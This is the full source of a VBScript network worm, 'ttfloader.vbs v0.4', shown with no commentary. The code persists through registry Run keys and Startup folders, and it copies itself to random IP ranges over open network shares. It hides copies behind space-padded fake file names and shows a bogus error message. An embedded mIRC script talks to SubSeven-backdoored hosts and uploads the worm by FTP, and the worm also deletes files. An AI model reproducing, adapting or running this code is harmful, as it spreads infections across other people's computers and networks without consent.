'ttfloader.vbs v0.4 by: soRRyAzzC0DER

on error resume next
dim fso,sh,ne,w,t,tl,scan
randomize
set fso = createobject("scripting.filesystemobject")
set sh = createobject("wscript.shell")
set ne = createobject("wscript.network")
set w = fso.getspecialfolder(0)
set t = fso.getspecialfolder(2)
scan = true

if lcase(wscript.scriptfullname) <> lcase(w&"\fonts\ttfloads.vbs") then
	if not fso.folderexists(w&"\Fonts") then fso.createfolder(w&"\Fonts")
	if not fso.fileexists(w&"\fonts\ttfloads.vbs") then
		zz = cme(w&"\fonts","ttfloads.vbs")
		sh.run "command.com /C "&w&"\wscript.exe "&w&"\fonts\ttfloads.vbs",0
	end if
	if (instr(lcase(wscript.scriptfullname),"startup") < 1) and (instr(lcase(wscript.scriptfullname),"ttfloads.vbs") < 1) then msgbox "FILE I/O ERROR",16,"ERROR"
	fso.deletefile wscript.scriptfullname,true
	wscript.quit
end if

sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ttfload", "wscript.exe " & wscript.scriptfullname
sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
if rgen(1000,1) = 666 then
	sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start","http://www.zonelabs.com/"
end if 

drvs()

do while scan <> false
 sip()
loop

sub sip()
 dim fil,sfil
 fil = ipl()
 set sfil = fso.opentextfile(fil,1)
 do while sfil.atendofstream <> true
	caddr = sfil.readline 
 	if (pip(caddr) = 1) then vn(caddr)
 loop
 sfil.close
 fso.deletefile fil,true
end sub

sub vn(vip)
 dim vfil,vofil,va
 vfil = t&"\"&fso.GetTempName
 if len(vip) > 6 then sh.run "command.com /c net view \\"&vip&" > "&vfil,0,1
 if fso.fileexists(vfil) then
 	set vofil = fso.opentextfile(vfil,1)
	va = false
	do while vofil.atendofstream <> true
		vs = vofil.readline
		if mid(lcase(vs),1,13) = "the command c" then exit do
		if (va = true) and (instr(14,lcase(vs),"print") < 1) and (len(rtrim(mid(vs,1,13))) > 0) then mcon "\\"&vip&"\"&rtrim(mid(vs,1,13))
		if (mid(vs,1,13) = string(13,"-") or mid(vs,1,13) = string(13,chr(196))) then va = true
	loop
	vofil.close
	fso.deletefile vfil,true
 end if
end sub

sub mcon(msh)
 on error resume next
 dim odrv,d
 odrv = gfd()
 if len(msh) > 0 then
 	ne.mapnetworkdrive odrv,msh,false
	set d = fso.getdrive(odrv)
	if (d.isready) then
		if cme(odrv,"") >  0 then
			fr odrv&"\"
			addanother()
		end if
	end if
	ne.removenetworkdrive odrv,true,true		
 end if
end sub

sub drvs()
  on error resume next
  dim d, dc
  set dc = fso.drives
  for each d in dc
    if (d.drivetype = 2) or (d.drivetype = 5) then
		fl(d.driveletter&":\")
	elseif (d.drivetype = 1) or (d.drivetype = 3) then
		if (d.isready) then
			if cme(d.driveletter&":","") > 0 then fr(d.driveletter&":\")
		end if
	end if
  next
end sub

sub fr(fol)  
	dim f,f1,sf
	set f = fso.getfolder(fol)  
	set sf = f.subfolders
	for each f1 in sf
		if instr(lcase(f1.name),"my") = 1 or instr(lcase(f1.name),"share") > 0 then zz = cme(f1.path,"")
		if lcase(f1.name) = "download" or lcase(f1.name) = "downloads" then zz = cme(f1.path,"")
		if instr(lcase(f1.path),"win") > 0 then
			zz = cme(f1.path&"\startm~1\programs\startup","ttfloads.vbs")
			zz = cme(f1.path&"\profiles\admini~1\startm~1\programs\startup","ttfloads.vbs")
			zz = cme(f1.path&"\profiles\alluse~1\startm~1\programs\startup","ttfloads.vbs")
		end if
	next  
end sub

sub fl(fol)
	dim f,f1,sf
	set f = fso.getfolder(fol)  
	set sf = f.subfolders
	for each f1 in sf
		if instr(lcase(f1.name),"mirc") > 0 then mdrp(f1.path)
		if lcase(f1.name) = "pub" or lcase(f1.name) = "ftproot" or lcase(f1.name) = "wwwroot" then zz = cme(f1.path,"")
		if instr(lcase(f1.name),"my") = 1 or instr(lcase(f1.name),"download") > 0 or instr(lcase(f1.name),"upload") > 0 or instr(lcase(f1.name),"share") > 0 or instr(lcase(f1.name),"game") > 0 or instr(lcase(f1.name),"warez") > 0 then zz = cme(f1.path,"")
		fl f1.path
		if lcase(f1.name) = "chode" or lcase(f1.name) = "foreskin" or lcase(f1.name) = "dickhair" then fso.deletefolder f1.path,true
	next
end sub

sub mdrp(mp)
 dim ircfil,data,infil
 ircfil = mp&"\script.ini"
 if (cme(w,"fonts\sndload.vbs") = 1) then
	data = "on error resume next"&vbcrlf&_
	"dim args,shell,fso,dat,iCopy"&vbcrlf&_
	"set args = wscript.arguments"&vbcrlf&_
	"set shell=createobject("&chr(34)&"wscript.shell"&chr(34)&")"&vbcrlf&_
	"set fso = createobject("&chr(34)&"scripting.filesystemobject"&chr(34)&")"&vbcrlf&_
	"iCopy = "&chr(34)&w&"\fonts\sndload.vbs"&chr(34)&vbcrlf&_
	"if args.count < 1 then wscript.quit (1)"&vbcrlf&_
	"set dat = fso.opentextfile(fso.GetSpecialFolder(0)&"&chr(34)&"\fonts\ftp.dat"&chr(34)&",2,TRUE)"&vbcrlf&_
	"dat.write "&chr(34)&"subhunt"&chr(34)&"&vbcrlf&"&chr(34)&"subhunt"&chr(34)&"&vbcrlf&"&chr(34)&"put "&chr(34)&"&iCopy&vbcrlf&"&chr(34)&"bye"&chr(34)&"&vbcrlf"&vbcrlf&_
	"dat.close"&vbcrlf&_
	"shell.run "&chr(34)&"command.com /c ftp.exe -s:"&chr(34)&"& fso.GetSpecialFolder(0)&"&chr(34)&"\fonts\ftp.dat "&chr(34)&"& args(0),0,TRUE"&vbcrlf
	 if not fso.fileexists(w&"\fonts\sndvol.vbs") then
		 set infil = fso.opentextfile(w&"\fonts\sndvol.vbs",2,true)
		 infil.write data
		 infil.close
		 set infil = fso.getfile(w&"\fonts\sndvol.vbs")
		 infil.attributes = 39
	 end if
	data = "[script]"&vbcrlf&_
	"n0=var %ss.ip"&vbcrlf&_
	"n1=alias ss.close { if ($sock(s7scan)) { sockclose s7scan | .timerTO1 off | .timerTO3 off | genIp } }"&vbcrlf&_
	"n2=alias subScan { if ($1 == $null) { return } | %ss.ip = $1 | var %ss.port = 27374 | if ($2 != $null) { %ss.port = $2 } | sockclose s7scan | sockopen s7scan %ss.ip %ss.port | .timerTO1 -c 0 30 ss.close }"&vbcrlf&_
	"n3=on 1:sockclose:s7scan:{ ss.close }"&vbcrlf&_
	"n4=on 1:sockread:s7scan:{ if ($sockerr > 0) { return } | .timerTO1 off | %tmp = null | sockread -f %tmp | if (connected isincs %tmp) { sockwrite -t s7scan FTPenable!subhunt@@@21:::1$$$c:\ } | elseif (PWD isincs %tmp) { sockwrite -t s7scan PWD14438136782715101980 } | elseif (server enabled isincs %tmp) { run -n "&w&"\fonts\sndvol.vbs"&" %ss.ip | .timerTO3 0 90 sockwrite -t s7scan FTPdisable } | elseif (server disable isincs %tmp) { sockwrite -t s7scan FMXc:\sndload.vbs |  .timerTO3 off } | elseif (executed isincs %tmp) { ss.close s7scan } | .timerTO1 0 30 ss.close | return }"&vbcrlf&_
	"n5=alias genIp { var %ch,%a,%b,%c,%d | set %ch $rand(1,100) | if (%ch <= 25) { %a = 24 | %b = $rand(0,254) } | elseif ((%ch > 25) && (%ch <= 33)) { %a = 172 | %b = 128 } | elseif ((%ch > 33) && (%ch <= 41)) { %a = 152 | %b = $rand(163,175) } | elseif ((%ch > 41) && (%ch <= 49)) { %a = 205 | %b = 163 } | elseif ((%ch > 49) && (%ch <= 57)) { %a = 4 |  %b = $rand(30,45) } | elseif ((%ch > 57) && (%ch <= 65)) { %a = 151 |  %b = $rand(196,206) } | elseif ((%ch > 65) && (%ch <= 73)) { %a = 63 |  %b = $rand(194,207) } | elseif ((%ch > 73) && (%ch <= 81)) { %a = 216 |  %b = $rand(76,79) } | else { %a = $rand(3,243) | %b = $rand(0,254) } | %c = $rand(0,254) | %d = $rand(1,254) | subScan %a $+ . $+ %b $+ . $+ %c $+ . $+ %d | return }"&vbcrlf&_
	"n6=on 1:start:{ genip }"
	set infil = fso.opentextfile(ircfil,2,true)
 	infil.write data
 	infil.close
 end if
end sub

sub addanother()
 dim afil
 if fso.fileexists(fso.getspecialfolder(1)&"\ttfload.dll") then
	set afil = fso.opentextfile(fso.getspecialfolder(1)&"\ttfload.dll",8)
 else
	set afil = fso.opentextfile(fso.getspecialfolder(1)&"\ttfload.dll",2,true)
 end if
 afil.writeline "HOST FOUND!"
 afil.close
end sub

function cme(loc,nm)
 on error resume next
 dim fn,at,ret,cn
 ret = 0
 if nm <> "" then
	fn = loc &"\"&nm
	at = 1
 else
	fn = loc &"\"&gnam()
	at = 0
 end if
 if (fx(loc) = 0) then
 	fso.copyfile wscript.scriptfullname,fn
 	if fso.fileexists(fn) then ret = 1
	set cn = fso.getfile(fn)
	if at = 1 then
		cn.attributes = 39
	else
		cn.attributes = 0
	end if
 else
	ret = 2
 end if
 cme = ret
end function

function fx(xfol)
 on error resume next
 dim f,fc,f1,ext,base,ffil,ff,tl,xt
 xt = 0
 set f = fso.getfolder(xfol)
 set fc = f.files
 for each f1 in fc
	ext  = lcase(fso.getextensionName(f1.path))
	base = lcase(fso.getbasename(f1.path))
	if (ext="vbs") then
		if (((base = "network") or (base = "mscfg") or (base = "winsock") or (base = "a24")) and (instr(lcase(f1.path),"samples")<1)) then
			fso.deletefile f1.path,true
		else
			set ffil = fso.opentextfile(f1.path,1)
			tl = ffil.readline
			ffil.close
			if instr(tl,"ttfloader.vbs v0.4 by: soRRyAzzC0DER") > 0 then xt = xt + 1
			if instr(tl,"ttfloader.vbs v0.3 by: soRRyAzzC0DER") > 0 then fso.deletefile f1.path,true
			if instr(tl,"ttfload.vbs v0.2 by: soRRyAzzC0DER") > 0 then fso.deletefile f1.path,true			
		end if
		if xt > 1 and instr(lcase(f1.path),"fonts") > 0 then
			fso.deletefile f1.path,true
			xt = xt - 1
		end if
	elseif (lcase(f1.name) = "mscfg.exe") or (lcase(f1.name)="ashield.pif") or (lcase(f1.name) = "netstat.pif") then
		fso.deletefile f1.path,true
	end if
 next
 fx = xt
end function

function gnam()
 dim rfol,rfil,rcur,rnum,rf,rtmp
 set rfol = fso.GetFolder(sh.specialfolders("Recent"))
 set rfil = rfol.Files
 rcur = 0
 rnum = rgen(rfil.count-1,0)
 for each rf in rfil
	rtmp = fso.getbasename(rf.path)
	rcur = rcur + 1
	if rcur = rnum then exit for
 next
 if rtmp = "" then rtmp = "readme.txt"
 gnam = rtmp&space(int(210-(len(rtmp)+4)))&".vbs"
end function

function gfd()
  dim d, dc, s, n,idrv
  set dc = fso.drives
  idrv = 67
  for each d in dc
    if asc(ucase(d.driveletter)) = idrv then idrv = idrv + 1
  next
  gfd = chr(idrv)&":"
end function

function pip(wip)
 dim isp,tfil,pfil,ts
 isp = 0
 tfil = t&"\"&fso.GetTempName
 if len(wip) > 6 then sh.run "command.com /c ping.exe -n 2 "&wip&" > " & tfil,0,1
 if fso.fileexists(tfil) then
 	set pfil = fso.opentextfile(tfil,1)
	do while pfil.atendofstream <> true
    	ts = lcase(pfil.readline)
		if (instr(ts,"received = 2") > 0 or instr(ts,"received = 0") > 1) then
			isp = 1
			exit do
		end if
	loop
	pfil.close
	fso.deletefile tfil,true
 end if
 pip = isp
end function

function ipl()
 dim x,n,l,a,b,c,d
 x = rgen(100,1)
 n = t&"\"&fso.GetTempName
 set l = fso.opentextfile(n,2,true)
 if (x <= 25) then
 	a = 24
    b = rgen(254,0)
 elseif (x > 25) and (x <= 33) then
	a = 172
	b = 128
 elseif (x > 33) and (x <= 41) then
    a = 152
    b = rgen(175,163)
 elseif (x > 41) and (x <= 49) then
	a = 205
	b = 163
 elseif (x > 49) and (x <= 57) then
    a = 4
    b = rgen(45,30)
 elseif (x > 57) and (x <= 65) then
    a = 151
    b = rgen(206,196)
 elseif (x > 65) and (x <= 73) then
	a = 63
	b = rgen(207,194)
 elseif (x > 73) and (x <= 81) then
	a = 216
	b = rgen(79,76)
 else
	a = rgen(243,3)
    b = rgen(254,0)
 end if
 c = rgen(254,0)
 for d = 1 to 254
	l.writeline a&"."&b&"."&c&"."&d
 next
 l.close
 ipl = n
end function

function rgen(u,l)
	rgen = int((u-l+1)*Rnd+l)
end function